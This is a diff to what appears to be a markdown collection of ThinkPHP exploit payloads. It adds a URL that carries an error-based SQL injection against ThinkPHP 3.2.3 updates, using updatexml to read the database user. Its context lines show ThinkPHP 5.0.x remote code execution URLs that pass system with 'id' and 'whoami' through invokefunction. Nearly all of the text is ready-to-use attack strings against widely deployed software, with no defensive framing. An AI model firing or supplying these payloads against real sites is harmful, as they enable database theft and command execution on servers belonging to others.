@@ -8,6 +8,12 @@ https://www.cnblogs.com/0xdd/p/11102426.html
 
 ## Thinkphp3
 
+Thinkphp3.2.3最新版update注入漏洞
+
+```
+/index.php/home/user?id[]=bind%27&money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
+```
+
 
 
 
@@ -37,6 +43,8 @@ Thinkphp 5.0.x
 /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 /index.php?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
 ```
+
+
 
 Thinkphp 5.1.x
 
